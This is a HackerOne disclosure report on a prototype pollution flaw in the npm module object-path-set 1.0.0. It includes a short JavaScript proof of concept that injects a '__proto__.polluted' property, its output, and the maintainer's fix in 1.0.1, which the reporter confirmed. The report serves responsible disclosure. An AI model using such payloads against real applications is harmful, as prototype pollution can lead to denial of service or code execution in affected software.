---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/high
  - cwe/modification-of-assumed-immutable-data-maid
  - env/web
  - stack/node
substate: "resolved"
weakness: "Modification of Assumed-Immutable Data (MAID)"
enriched: true
body: true
date: 2020-08-20
submitted: 2020-05-19T19:17:47.109Z
bounty_usd: null
votes: 0
cve: []
program: "[[programs/nodejs-ecosystem|Node.js third-party modules]]"
reporter: "d3lla"
source: "https://hackerone.com/reports/878332"
title: "[object-path-set] Prototype pollution"
---
# [object-path-set] Prototype pollution

> **Severity:** High | **Bounty:** undisclosed | **Votes:** 0 | **Program:** Node.js third-party modules | **Disclosed:** 2020-08-20

- Report: [https://hackerone.com/reports/878332](https://hackerone.com/reports/878332)
- CWE: Modification of Assumed-Immutable Data (MAID)
- Submitted: 2020-05-19T19:17:47.109Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

I would like to report a `prototype pollution` vulnerability in `object-path-set` module.
It allows an attacker to inject properties on Object.prototype.

# Module

**module name:** `object-path-set`
**version:** `1.0.0`
**npm page:** `https://www.npmjs.com/package/object-path-set`

## Module Description

set values in javascript objects by specifying a path.
if the path doesn't exist yet, it will be created.

## Module Stats

[81] weekly downloads

# Vulnerability

## Vulnerability Description

The `setPath` function can be used to add/modify properties of the Object prototype. These properties will be present on all objects.

## Steps To Reproduce:
- install `object-path-set` module:
    - `npm i object-path-set`

Set the `__proto__.polluted` property of an object:
```javascript

const setPath = require('object-path-set');
const obj = {};
console.log("Before : " + obj.polluted);
setPath({}, '__proto__.polluted', 'yes');
console.log("After : " + obj.polluted);
```
Output:
```console

Before : undefined
After : yes
```
{F835049}

## Supporting Material/References:

- OPERATING SYSTEM VERSION: Ubuntu 18.04.4 LTS
- NODEJS VERSION: v14.1.0
- NPM VERSION: 6.14.5

# Wrap up

- I contacted the maintainer to let them know: [N] 
- I opened an issue in the related repository: [N] 


Thank you for your time.

best regards,

d3lla

## Impact

The impact depends on the application. In some cases it is possible to achieve Denial of service (DoS), Remote Code Execution, Property Injection.

## Timeline

- **Report Filed**
- **2020-05-19** @nochnoidozor: Hi @d3lla,

Thank you for your submission. Your report is currently being reviewed and the HackerOne triage team will get back to you once there is additional information to share.

Kind regards,
@nochnoidozor
- **Report Triaged**
- **External User Joined**
- **2020-07-25** @skratchdot: Thanks for this report!  I published a new version of the module `object-path-set@1.0.1`:
https://www.npmjs.com/package/object-path-set

Let me know if the bug is fixed and if you want credited in the README.
- **2020-08-02** @d3lla: Hi @skratchdot,
thanks for your reply and for the fix.


Your changes seems to fix the problem.
I run the previous poc:
```javascript
const setPath = require('object-path-set');
const obj = {};
console.log("Before : " + obj.polluted);
setPath({}, '__proto__.polluted', 'yes');
console.log("After : " + obj.polluted);
```
and I was not able to reproduce the previous reported result.
Now I get:
```
Before : undefined
After : undefined
```

About the credit, for me it's enough this report but thanks for asking.

Thanks for your time and have a nice day,
d3lla

I tested using the following configurations:

- OPERATING SYSTEM VERSION: Ubuntu 18.04.4 LTS
- NODEJS VERSION: v14.2.0
- NPM VERSION: 6.14.4
- **Report Resolved**
- **Agreed On Going Public**
- **Agreed On Going Public**
- **Report Became Public**
